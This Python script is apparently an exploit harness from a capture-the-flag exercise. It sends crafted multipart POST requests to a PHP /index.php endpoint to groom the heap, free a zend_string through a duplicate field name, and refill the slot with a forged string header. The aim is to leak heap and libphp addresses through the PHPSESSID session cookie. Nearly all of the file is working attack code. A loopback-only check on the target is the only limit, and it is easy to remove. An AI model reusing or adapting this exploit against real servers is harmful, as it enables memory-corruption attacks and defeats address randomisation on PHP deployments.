#!/usr/bin/env python3
"""Loopback-only rank/release/reclaim proof for the bridge arm.

The live bridge consumer can return an exact 48-byte ``vNNNN`` value when a
registered filler occupies the dangling session-id slot.  This harness turns
that observation into a three-step, falsifiable local experiment:

* ``probe`` identifies the filler rank;
* ``depth-probe`` overwrites that exact field name, releasing the landed
  zend_string, then identifies the first post-release allocation that reuses it;
* ``reclaim`` repeats the same prefix and replaces the measured depth marker
  with a raw fake header in the same allocator class (72 bytes by default).

Only plain-HTTP loopback ``/index.php`` targets are accepted.  There is no live
switch, terminal stage, or verifier path.
"""

from __future__ import annotations

import argparse
from dataclasses import dataclass
import json
import os
from pathlib import Path
import re
import socket
import struct
import sys
import time
import urllib.parse
from collections.abc import Sequence


sys.path.insert(0, "/root/bridge")
sys.path.insert(0, "/root/bridge/stock")
sys.path.insert(0, "/root/chainetool-v106/e2e")
sys.path.insert(0, "/root/cfctf-mirror")

from p2s import transplant  # noqa: E402
import bridge_common as bridge  # noqa: E402


LOOPBACK = {"127.0.0.1", "localhost", "::1"}
MAX_FIELDS = 1000
DEFAULT_FILLERS = 816
DEFAULT_ARRAYS = 150
DEFAULT_PREAMBLE = 1_048_437
DEFAULT_DTOR = 0x7EAF60
DEFAULT_FORGE_SIZE = 72
MIN_BIN80_FORGE_SIZE = 64
MAX_BIN80_FORGE_SIZE = 79
BIN80_GUARD_KEY_BYTES = 72
BIN112_COPY_GUARD_KEY_BYTES = 103
MAX_GUARD_COUNT = 16
MAX_COPY_GUARD_COUNT = 64
MAX_PRESSURE_LINES = 600_000
MAX_POST_RAW_CHAIN_DEPTH = 64
RELEASE_VALUE = b"q"
ARM_PROFILE_CHALLENGE = "challenge"
ARM_PROFILE_BIN80_CONTROL = "bin80-control"
ARM_PROFILES = (ARM_PROFILE_CHALLENGE, ARM_PROFILE_BIN80_CONTROL)
BIN80_CONTROL_SID = b"R" * 48
ARRAY_ORDER_BEFORE = "before"
ARRAY_ORDER_AFTER = "after"
ARRAY_ORDERS = (ARRAY_ORDER_BEFORE, ARRAY_ORDER_AFTER)


@dataclass(frozen=True)
class Field:
    name: bytes
    value: bytes = b""
    extra_headers: tuple[tuple[bytes, bytes], ...] = ()
    lf_pressure_lines: int = 0
    role: str = "field"


def multipart_part(field: Field, boundary: bytes = bridge.DISC_BOUNDARY) -> bytes:
    if not field.name or any(byte in field.name for byte in b'"\r\n'):
        raise ValueError("unsafe field name")
    header = (
        b"--" + boundary
        + b'\r\nContent-Disposition: form-data; name="'
        + field.name + b'"'
    )
    for key, value in field.extra_headers:
        if (
            not key
            or len(key) not in {
                BIN80_GUARD_KEY_BYTES, BIN112_COPY_GUARD_KEY_BYTES
            }
            or any(byte <= 32 or byte >= 127 for byte in key)
            or b"\r" in value
            or b"\n" in value
        ):
            raise ValueError("unsafe guard header")
        header += b"\r\n" + key + b": " + value
    if not 0 <= field.lf_pressure_lines <= MAX_PRESSURE_LINES:
        raise ValueError("LF pressure lines must be in 0..600000")
    if field.lf_pressure_lines:
        # PHP accepts LF-only MIME header lines. The single CRLF after this
        # run is the empty line ending the header block; field.value begins
        # immediately after it, without an injected leading CRLF.
        header += b"\r\n" + (b":\n" * field.lf_pressure_lines)
        return header + b"\r\n" + field.value + b"\r\n"
    return header + b"\r\n\r\n" + field.value + b"\r\n"


def finish_multipart(fields: Sequence[Field]) -> bytes:
    return b"".join(multipart_part(field) for field in fields) + (
        b"--" + bridge.DISC_BOUNDARY + b"--\r\n"
    )


def drain_marker48(depth: int) -> bytes:
    if not 0 <= depth <= 995:
        raise ValueError("drain depth must be in 0..995")
    prefix = f"D{depth:04d}".encode("ascii")
    return prefix + b"N" * (48 - len(prefix))


def drain_name(depth: int) -> bytes:
    return str(3000 + depth).encode("ascii")


def registration_chain_name(depth: int) -> bytes:
    if not 1 <= depth <= MAX_POST_RAW_CHAIN_DEPTH:
        raise ValueError("post-raw registration chain depth must be in 1..64")
    return b"r" + (b"[x]" * depth)


def guard_header_key(index: int) -> bytes:
    prefix = f"X-R8-BIN8-GUARD-{index:02d}-".encode("ascii")
    return prefix + b"G" * (BIN80_GUARD_KEY_BYTES - len(prefix))


def copy_guard_header_key(index: int) -> bytes:
    prefix = f"X-R8-BIN112-COPY-GUARD-{index:02d}-".encode("ascii")
    return prefix + b"C" * (BIN112_COPY_GUARD_KEY_BYTES - len(prefix))


def forge_value(leak_length: int, size: int = DEFAULT_FORGE_SIZE) -> bytes:
    if not 0x100 <= leak_length <= 0x80000:
        raise ValueError("leak length must be in 0x100..0x80000")
    if not MIN_BIN80_FORGE_SIZE <= size <= MAX_BIN80_FORGE_SIZE:
        raise ValueError("bin-80 forge size must be in 64..79")
    forged = bytearray(size)
    struct.pack_into("<I", forged, 0x00, 0)
    struct.pack_into("<I", forged, 0x04, 0x16)
    struct.pack_into("<Q", forged, 0x08, 0)
    struct.pack_into("<Q", forged, 0x10, leak_length)
    forged[0x18] = ord("/")
    return bytes(forged)


def filler48(index: int) -> bytes:
    if not 0 <= index <= 995:
        raise ValueError("filler index must be in 0..995")
    return (f"v{index:04d}" + "x" * 44)[:48].encode("ascii")


def filler_name(index: int) -> bytes:
    return str(1000 + index).encode("ascii")


def array_fields(count: int) -> list[Field]:
    return [
        Field(
            f"a{index:04d}[0]".encode("ascii"),
            b"x",
            role=f"array-{index}",
        )
        for index in range(count)
    ]


def guard_headers(count: int) -> tuple[tuple[bytes, bytes], ...]:
    return tuple((guard_header_key(index), b"g") for index in range(count))


def copy_guard_headers(count: int) -> tuple[tuple[bytes, bytes], ...]:
    return tuple((copy_guard_header_key(index), b"c") for index in range(count))


def carrier_fields() -> list[Field]:
    return [
        Field(b"PHPSESSID", transplant.WINDOW_SID, role="session-carrier"),
        Field(
            b"PHP_SESSION_UPLOAD_PROGRESS", b"pwn", role="progress-trigger"
        ),
    ]


def flush_body(arrays: int = 0) -> bytes:
    """Small multipart END callback used after a retained-forge bailout.

    Optional one-byte array fields are parsed in C itself so their live
    HashTable destructors can supply module pointers to the forged disclosure.
    """
    if not 0 <= arrays <= DEFAULT_ARRAYS:
        raise ValueError("flush arrays must be in 0..150")
    fields = carrier_fields()
    fields.extend(array_fields(arrays))
    return finish_multipart(tuple(fields))


def arm_body(profile: str) -> bytes:
    if profile == ARM_PROFILE_CHALLENGE:
        return bridge.arm_body()
    if profile == ARM_PROFILE_BIN80_CONTROL:
        return bridge.chain8511.arm_body(
            bridge.ARM_LINES,
            bridge.ARM_PADS,
            bridge.ARM_BOUNDARY,
            order="published",
            sid=BIN80_CONTROL_SID,
        )
    raise ValueError(f"arm profile must be one of: {', '.join(ARM_PROFILES)}")


def landed_prefix(rank: int, fillers: int) -> list[Field]:
    if not 1 <= fillers <= 996:
        raise ValueError("fillers must be in 1..996")
    if not 0 <= rank < fillers:
        raise ValueError("rank must be within the filler profile")
    fields = carrier_fields()
    fields.extend(
        Field(
            filler_name(index), filler48(index), role=f"filler-{index}"
        )
        for index in range(fillers)
    )
    return fields


def probe_fields(fillers: int, arrays: int) -> tuple[Field, ...]:
    if not 1 <= fillers <= 996:
        raise ValueError("fillers must be in 1..996")
    if not 0 <= arrays <= DEFAULT_ARRAYS:
        raise ValueError("arrays must be in 0..150")
    fields = carrier_fields()
    fields.extend(
        Field(
            filler_name(index), filler48(index), role=f"filler-{index}"
        )
        for index in range(fillers)
    )
    fields.extend(array_fields(arrays))
    if len(fields) > MAX_FIELDS:
        raise ValueError("probe exceeds max_input_vars")
    return tuple(fields)


def probe_body(fillers: int, arrays: int) -> bytes:
    return finish_multipart(probe_fields(fillers, arrays))


def depth_probe_fields(
    rank: int,
    fillers: int,
    drain_count: int,
    arrays: int,
    guards: int,
    *,
    array_order: str = ARRAY_ORDER_BEFORE,
) -> tuple[Field, ...]:
    if not 1 <= drain_count <= 996:
        raise ValueError("drain_count must be in 1..996")
    if not 0 <= arrays <= DEFAULT_ARRAYS:
        raise ValueError("arrays must be in 0..150")
    if not 0 <= guards <= MAX_GUARD_COUNT:
        raise ValueError("guards must be in 0..16")
    if array_order not in ARRAY_ORDERS:
        raise ValueError(f"array_order must be one of: {', '.join(ARRAY_ORDERS)}")
    fields = landed_prefix(rank, fillers)
    if array_order == ARRAY_ORDER_BEFORE:
        fields.extend(array_fields(arrays))
    fields.append(
        Field(
            filler_name(rank), RELEASE_VALUE, role="release-exact-rank"
        )
    )
    headers = guard_headers(guards)
    fields.extend(
        Field(
            drain_name(depth),
            drain_marker48(depth),
            extra_headers=headers,
            role=f"drain-marker-{depth}",
        )
        for depth in range(drain_count)
    )
    if array_order == ARRAY_ORDER_AFTER:
        fields.extend(array_fields(arrays))
    if len(fields) > MAX_FIELDS:
        raise ValueError("depth probe exceeds max_input_vars")
    return tuple(fields)


def depth_probe_body(
    rank: int,
    fillers: int,
    drain_count: int,
    arrays: int,
    guards: int,
    *,
    array_order: str = ARRAY_ORDER_BEFORE,
) -> bytes:
    return finish_multipart(
        depth_probe_fields(
            rank, fillers, drain_count, arrays, guards,
            array_order=array_order,
        )
    )


def reclaim_fields(
    rank: int,
    fillers: int,
    depth: int,
    arrays: int,
    guards: int,
    leak_length: int,
    forge_size: int,
    pressure_lines: int = 0,
    post_raw_chain_depth: int = 0,
    copy_guard_count: int = 0,
    *,
    array_order: str = ARRAY_ORDER_BEFORE,
) -> tuple[Field, ...]:
    if not 0 <= depth <= 995:
        raise ValueError("depth must be in 0..995")
    if not 0 <= arrays <= DEFAULT_ARRAYS:
        raise ValueError("arrays must be in 0..150")
    if not 0 <= guards <= MAX_GUARD_COUNT:
        raise ValueError("guards must be in 0..16")
    if not 0 <= pressure_lines <= MAX_PRESSURE_LINES:
        raise ValueError("pressure_lines must be in 0..600000")
    if not 0 <= post_raw_chain_depth <= MAX_POST_RAW_CHAIN_DEPTH:
        raise ValueError("post_raw_chain_depth must be in 0..64")
    if not 0 <= copy_guard_count <= MAX_COPY_GUARD_COUNT:
        raise ValueError("copy_guard_count must be in 0..64")
    if array_order not in ARRAY_ORDERS:
        raise ValueError(f"array_order must be one of: {', '.join(ARRAY_ORDERS)}")
    fields = landed_prefix(rank, fillers)
    if array_order == ARRAY_ORDER_BEFORE:
        fields.extend(array_fields(arrays))
    fields.append(
        Field(
            filler_name(rank), RELEASE_VALUE, role="release-exact-rank"
        )
    )
    headers = guard_headers(guards)
    fields.extend(
        Field(
            drain_name(index),
            drain_marker48(index),
            extra_headers=headers,
            role=f"drain-before-forge-{index}",
        )
        for index in range(depth)
    )
    fields.append(
        Field(
            (
                registration_chain_name(post_raw_chain_depth)
                if post_raw_chain_depth else drain_name(depth)
            ),
            forge_value(leak_length, forge_size),
            extra_headers=headers + copy_guard_headers(copy_guard_count),
            lf_pressure_lines=pressure_lines,
            role=f"forge-depth-{depth}",
        )
    )
    if array_order == ARRAY_ORDER_AFTER:
        fields.extend(array_fields(arrays))
    if len(fields) > MAX_FIELDS:
        raise ValueError("reclaim exceeds max_input_vars")
    return tuple(fields)


def reclaim_body(
    rank: int,
    fillers: int,
    depth: int,
    arrays: int,
    guards: int,
    leak_length: int,
    forge_size: int,
    pressure_lines: int = 0,
    post_raw_chain_depth: int = 0,
    copy_guard_count: int = 0,
    *,
    array_order: str = ARRAY_ORDER_BEFORE,
) -> bytes:
    return finish_multipart(
        reclaim_fields(
            rank, fillers, depth, arrays, guards, leak_length, forge_size,
            pressure_lines, post_raw_chain_depth, copy_guard_count,
            array_order=array_order,
        )
    )


def exchange(
    host: str,
    port: int,
    path: str,
    body: bytes,
    boundary: bytes,
    timeout: float,
) -> bytes:
    sock = socket.create_connection((host, port), timeout=timeout)
    sock.settimeout(timeout)
    head = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        "User-Agent: bridge-rank-reclaim-lab/1\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary.decode('ascii')}\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Connection: close\r\n\r\n"
    ).encode("ascii")
    data = bytearray()
    try:
        sock.sendall(head + body)
        while len(data) < 2 << 20:
            try:
                chunk = sock.recv(min(65536, (2 << 20) - len(data)))
            except socket.timeout:
                break
            if not chunk:
                break
            data.extend(chunk)
    finally:
        sock.close()
    return bytes(data)


def status(raw: bytes) -> int:
    match = re.match(rb"HTTP/1\.[01]\s+(\d{3})(?:\s|$)", raw)
    return int(match.group(1)) if match else 0


def response_record(raw: bytes, dtor: int) -> tuple[dict, bytes]:
    cookie = bridge.cookie_from_raw(raw)
    try:
        decoded = transplant.decode(cookie, dtor) if cookie else None
    except (IndexError, KeyError, struct.error, ValueError):
        decoded = None
    strict = bool(decoded and decoded.get("heap") and decoded.get("libphp"))
    head, separator, body = raw.partition(b"\r\n\r\n")
    if not separator:
        head, body = raw, b""
    encoded_cookies = re.findall(
        rb"(?im)^Set-Cookie\s*:\s*PHPSESSID=([^;\r\n]*)", head
    )
    cookies = [urllib.parse.unquote_to_bytes(value) for value in encoded_cookies]
    tried_match = re.search(rb"tried to allocate ([0-9]+) bytes", raw)
    tried_bytes = int(tried_match.group(1)) if tried_match else None
    filler_rank = None
    if (
        len(cookie) == 48
        and cookie.startswith(b"v")
        and cookie[1:5].isdigit()
    ):
        candidate = int(cookie[1:5])
        if 0 <= candidate <= 995 and cookie == filler48(candidate):
            filler_rank = candidate
    drain_depth = None
    if len(cookie) == 48 and cookie.startswith(b"D"):
        try:
            candidate = int(cookie[1:5])
        except ValueError:
            candidate = -1
        if candidate >= 0 and cookie == drain_marker48(candidate):
            drain_depth = candidate
    record = {
        "status": status(raw),
        "oom": b"Allowed memory size" in raw,
        "oom_tried_bytes": tried_bytes,
        "oom_tried_high32": (
            hex(tried_bytes >> 32) if tried_bytes is not None else None
        ),
        "response_bytes": len(raw),
        "cookie_bytes": len(cookie),
        "cookie_hex": cookie.hex() if 0 < len(cookie) <= 64 else None,
        "cookie_prefix_hex": cookie[:64].hex() if cookie else None,
        "set_cookie_count": len(cookies),
        "set_cookie_lengths": [len(value) for value in cookies],
        "body_excerpt_latin1": body[:320].decode("latin1", "replace"),
        "filler_rank": filler_rank,
        "drain_depth": drain_depth,
        "strict_dual_base": strict,
        "heap": hex(decoded["heap"]) if decoded and decoded.get("heap") else None,
        "libphp": (
            hex(decoded["libphp"])
            if decoded and decoded.get("libphp")
            else None
        ),
        "heap_votes": decoded.get("heap_votes", 0) if decoded else 0,
        "module_votes": decoded.get("module_votes", 0) if decoded else 0,
    }
    return record, cookie


def write_exclusive(path: Path, document: dict) -> None:
    encoded = (json.dumps(document, indent=2, sort_keys=True) + "\n").encode()
    flags = os.O_WRONLY | os.O_CREAT | os.O_EXCL
    if hasattr(os, "O_NOFOLLOW"):
        flags |= os.O_NOFOLLOW
    descriptor = os.open(path, flags, 0o600)
    try:
        os.write(descriptor, encoded)
        os.fsync(descriptor)
    finally:
        os.close(descriptor)


def write_blob_exclusive(path: Path, payload: bytes) -> None:
    flags = os.O_WRONLY | os.O_CREAT | os.O_EXCL
    if hasattr(os, "O_NOFOLLOW"):
        flags |= os.O_NOFOLLOW
    descriptor = os.open(path, flags, 0o600)
    try:
        os.write(descriptor, payload)
        os.fsync(descriptor)
    finally:
        os.close(descriptor)


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=True)
    parser.add_argument(
        "--mode", choices=("probe", "depth-probe", "reclaim"), required=True
    )
    parser.add_argument(
        "--arm-profile", choices=ARM_PROFILES, default=ARM_PROFILE_CHALLENGE
    )
    parser.add_argument("--fillers", type=int, default=DEFAULT_FILLERS)
    parser.add_argument("--rank", type=int)
    parser.add_argument("--drain-count", type=int, default=31)
    parser.add_argument("--depth", type=int, default=0)
    parser.add_argument("--guard-count", type=int, default=0)
    parser.add_argument("--arrays", type=int, default=DEFAULT_ARRAYS)
    parser.add_argument(
        "--array-order", choices=ARRAY_ORDERS, default=ARRAY_ORDER_BEFORE
    )
    parser.add_argument("--preamble", type=int, default=DEFAULT_PREAMBLE)
    parser.add_argument("--leak-length", type=lambda value: int(value, 0), default=0x20000)
    parser.add_argument("--forge-size", type=int, default=DEFAULT_FORGE_SIZE)
    parser.add_argument("--pressure-lines", type=int, default=0)
    parser.add_argument("--post-raw-chain-depth", type=int, default=0)
    parser.add_argument("--copy-guard-count", type=int, default=0)
    parser.add_argument("--flush-after-reclaim", action="store_true")
    parser.add_argument("--flush-preamble", type=int, default=0)
    parser.add_argument("--flush-arrays", type=int, default=0)
    parser.add_argument("--dtor", type=lambda value: int(value, 0), default=DEFAULT_DTOR)
    parser.add_argument("--timeout", type=float, default=90.0)
    parser.add_argument("--out", required=True, type=Path)
    parser.add_argument("--cookie-out", type=Path)
    args = parser.parse_args()

    parsed = urllib.parse.urlsplit(args.target)
    if not (
        parsed.scheme == "http"
        and parsed.hostname in LOOPBACK
        and parsed.path == "/index.php"
        and parsed.port is not None
        and not parsed.query
        and not parsed.fragment
        and parsed.username is None
        and parsed.password is None
    ):
        parser.error("target must be a loopback stock-twin /index.php URL")
    if args.mode != "probe" and args.rank is None:
        parser.error("depth-probe/reclaim require --rank")
    if not 1 <= args.fillers <= 996:
        parser.error("fillers must be in 1..996")
    if args.rank is not None and not 0 <= args.rank < args.fillers:
        parser.error("rank must be within the filler profile")
    if not 1 <= args.drain_count <= 996:
        parser.error("drain-count must be in 1..996")
    if not 0 <= args.depth <= 995:
        parser.error("depth must be in 0..995")
    if not 0 <= args.guard_count <= MAX_GUARD_COUNT:
        parser.error("guard-count must be in 0..16")
    if not 0 <= args.pressure_lines <= MAX_PRESSURE_LINES:
        parser.error("pressure-lines must be in 0..600000")
    if not 0 <= args.post_raw_chain_depth <= MAX_POST_RAW_CHAIN_DEPTH:
        parser.error("post-raw-chain-depth must be in 0..64")
    if not 0 <= args.copy_guard_count <= MAX_COPY_GUARD_COUNT:
        parser.error("copy-guard-count must be in 0..64")
    if args.mode != "reclaim" and (
        args.pressure_lines
        or args.post_raw_chain_depth
        or args.copy_guard_count
        or args.flush_after_reclaim
        or args.flush_preamble
        or args.flush_arrays
    ):
        parser.error("pressure/registration-chain controls are reclaim-only")
    if not 0 <= args.flush_preamble <= 2 << 20:
        parser.error("flush-preamble must be in 0..2 MiB")
    if args.flush_preamble and not args.flush_after_reclaim:
        parser.error("flush-preamble requires --flush-after-reclaim")
    if not 0 <= args.flush_arrays <= DEFAULT_ARRAYS:
        parser.error("flush-arrays must be in 0..150")
    if args.flush_arrays and not args.flush_after_reclaim:
        parser.error("flush-arrays requires --flush-after-reclaim")
    if not MIN_BIN80_FORGE_SIZE <= args.forge_size <= MAX_BIN80_FORGE_SIZE:
        parser.error("bin-80 forge-size must be in 64..79")
    if not 0 <= args.arrays <= DEFAULT_ARRAYS:
        parser.error("arrays must be in 0..150")
    if args.mode == "probe" and (
        args.fillers + args.arrays + 2 > MAX_FIELDS
    ):
        parser.error("fillers/arrays exceed max_input_vars")
    if args.mode == "depth-probe" and (
        args.fillers + args.arrays + args.drain_count + 3 > MAX_FIELDS
    ):
        parser.error("fillers/arrays/drain-count exceed max_input_vars")
    if args.mode == "reclaim" and (
        args.fillers + args.arrays + args.depth + 4 > MAX_FIELDS
    ):
        parser.error("fillers/arrays/depth exceed max_input_vars")
    if not 1_000_000 <= args.preamble <= 2 << 20:
        parser.error("preamble must be in 1,000,000..2 MiB")
    if not 0.1 <= args.timeout <= 300.0:
        parser.error("timeout must be in 0.1..300 seconds")
    output = args.out.resolve()
    if os.path.lexists(output) or not output.parent.is_dir():
        parser.error("fresh output in an existing directory required")
    cookie_output = args.cookie_out.resolve() if args.cookie_out else None
    if cookie_output and (
        os.path.lexists(cookie_output) or not cookie_output.parent.is_dir()
    ):
        parser.error("fresh cookie output in an existing directory required")

    if args.mode == "probe":
        b_fields = probe_fields(args.fillers, args.arrays)
    elif args.mode == "depth-probe":
        b_fields = depth_probe_fields(
            int(args.rank), args.fillers, args.drain_count,
            args.arrays, args.guard_count, array_order=args.array_order,
        )
    else:
        b_fields = reclaim_fields(
            int(args.rank), args.fillers, args.depth, args.arrays,
            args.guard_count, args.leak_length, args.forge_size,
            args.pressure_lines, args.post_raw_chain_depth,
            args.copy_guard_count,
            array_order=args.array_order,
        )
    b_native = finish_multipart(b_fields)
    a_wire = bridge.preamble_pad(arm_body(args.arm_profile), args.preamble)
    b_wire = bridge.preamble_pad(b_native, args.preamble)
    c_native = flush_body(args.flush_arrays) if args.flush_after_reclaim else None
    c_wire = (
        bridge.preamble_pad(c_native, args.flush_preamble)
        if c_native is not None and args.flush_preamble
        else c_native
    )
    began = time.monotonic()
    a_raw = exchange(
        parsed.hostname or "", parsed.port, parsed.path,
        a_wire, bridge.ARM_BOUNDARY, args.timeout,
    )
    b_raw = exchange(
        parsed.hostname or "", parsed.port, parsed.path,
        b_wire, bridge.DISC_BOUNDARY, args.timeout,
    )
    c_raw = (
        exchange(
            parsed.hostname or "", parsed.port, parsed.path,
            c_wire, bridge.DISC_BOUNDARY, args.timeout,
        )
        if c_wire is not None else None
    )
    a_record, a_cookie = response_record(a_raw, args.dtor)
    b_record, b_cookie = response_record(b_raw, args.dtor)
    if c_raw is not None:
        c_record, c_cookie = response_record(c_raw, args.dtor)
    else:
        c_record, c_cookie = None, b""
    document = {
        "schema": "cfctf-r8/bridge-rank-reclaim-lab/v1",
        "target": args.target,
        "mode": args.mode,
        "arm_profile": args.arm_profile,
        "arm_session_id_bytes": (
            len(BIN80_CONTROL_SID)
            if args.arm_profile == ARM_PROFILE_BIN80_CONTROL else None
        ),
        "preamble_bytes": args.preamble,
        "dtor_offset": hex(args.dtor),
        "fillers": args.fillers,
        "rank": args.rank,
        "release_field_name": (
            filler_name(int(args.rank)).decode("ascii")
            if args.mode != "probe" else None
        ),
        "drain_count": args.drain_count if args.mode == "depth-probe" else None,
        "depth": args.depth if args.mode == "reclaim" else None,
        "guard_count": args.guard_count,
        "arrays": args.arrays,
        "array_order": args.array_order,
        "leak_length": args.leak_length,
        "forge_size": args.forge_size if args.mode == "reclaim" else None,
        "pressure_lines": (
            args.pressure_lines if args.mode == "reclaim" else None
        ),
        "pressure_bytes": (
            args.pressure_lines * 2 if args.mode == "reclaim" else None
        ),
        "pressure_line_ending": (
            "LF" if args.mode == "reclaim" and args.pressure_lines else None
        ),
        "post_raw_chain_depth": (
            args.post_raw_chain_depth if args.mode == "reclaim" else None
        ),
        "copy_guard_count": (
            args.copy_guard_count if args.mode == "reclaim" else None
        ),
        "copy_guard_key_bytes": (
            BIN112_COPY_GUARD_KEY_BYTES
            if args.mode == "reclaim" and args.copy_guard_count else None
        ),
        "flush_after_reclaim": args.flush_after_reclaim,
        "flush_preamble_bytes": args.flush_preamble,
        "flush_arrays": args.flush_arrays,
        "wire": {
            "a_bytes": len(a_wire),
            "b_bytes": len(b_wire),
            "c_bytes": len(c_wire) if c_wire is not None else None,
        },
        "native_consumer": {
            "field_count": len(b_fields),
            "body_bytes": len(b_native),
            "landed_value_bytes": 48,
            "forge_raw_value_bytes": (
                args.forge_size if args.mode == "reclaim" else None
            ),
            "forge_raw_allocation_request_bytes": (
                args.forge_size + 1 if args.mode == "reclaim" else None
            ),
            "forge_field_name_bytes": (
                len(next(
                    field.name for field in b_fields
                    if field.role == f"forge-depth-{args.depth}"
                )) if args.mode == "reclaim" else None
            ),
        },
        "a": a_record,
        "b": b_record,
        "c": c_record,
        "elapsed_s": round(time.monotonic() - began, 3),
    }
    arm_ok = a_record["status"] == 200 and a_record["oom"]
    consumer_ok = b_record["status"] == 200
    if not arm_ok:
        document["verdict"] = "ARM_GATE_MISS"
    elif not consumer_ok:
        document["verdict"] = "B_GATE_MISS"
    elif args.mode == "probe":
        document["observed_rank"] = b_record["filler_rank"]
        document["verdict"] = (
            "RANK_FOUND" if b_record["filler_rank"] is not None else "RANK_MISS"
        )
    elif args.mode == "depth-probe":
        document["observed_depth"] = b_record["drain_depth"]
        document["verdict"] = (
            "DEPTH_FOUND" if b_record["drain_depth"] is not None else "DEPTH_MISS"
        )
    elif args.flush_after_reclaim:
        document["verdict"] = (
            "STRICT_DUAL_BASE_FLUSH_LEAK"
            if c_record and c_record["strict_dual_base"] else "FLUSH_MISS"
        )
    else:
        document["verdict"] = (
            "STRICT_DUAL_BASE_LEAK" if b_record["strict_dual_base"] else "RECLAIM_MISS"
        )
    write_exclusive(output, document)
    if cookie_output is not None:
        write_blob_exclusive(cookie_output, c_cookie if c_raw is not None else b_cookie)
    print(json.dumps(document, indent=2))
    return 0 if document["verdict"] in {
        "RANK_FOUND", "DEPTH_FOUND", "STRICT_DUAL_BASE_LEAK",
        "STRICT_DUAL_BASE_FLUSH_LEAK",
    } else 2


if __name__ == "__main__":
    raise SystemExit(main())
